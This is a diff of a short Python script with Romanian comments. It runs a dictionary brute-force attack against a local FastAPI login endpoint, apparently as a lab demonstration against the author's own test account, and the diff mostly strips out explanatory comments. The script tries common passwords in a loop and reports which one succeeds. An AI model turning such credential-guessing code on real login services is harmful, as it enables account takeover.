@@ -1,17 +1,17 @@
 import requests
 import time
 
-# Configurarea țintei
-URL = "http://127.0.0.1:8000/login"
-TARGET_EMAIL = "hacker@authx.com" # Schimbă cu email-ul pe care l-ai înregistrat tu
 
-# Un "dicționar" mic de parole pe care atacatorul le încearcă
+URL = "http://127.0.0.1:8000/login"
+TARGET_EMAIL = "hacker@authx.com"
+
+
 PASSWORD_LIST = [
     "123456",
     "password",
     "admin123",
     "qwerty",
-    "123", # Presupunem că asta e parola corectă setată de tine anterior
+    "123",
     "hacker99"
 ]
 
@@ -21,7 +21,6 @@ print("[*] --------------------------------------------------")
 for password in PASSWORD_LIST:
     print(f"[*] Încercăm parola: '{password}'...")
     
-    # Construim payload-ul exact cum îl așteaptă FastAPI
     payload = {
         "email": TARGET_EMAIL,
         "password": password
@@ -43,7 +42,6 @@ for password in PASSWORD_LIST:
     else:
         print(f"[-] Eroare neașteptată: {response.status_code}")
         
-    # Punem o mică pauză doar ca să vedem frumos în terminal (la un atac real ar fi zero)
     time.sleep(0.5)
 
 print("\n[*] Atacul s-a încheiat.")
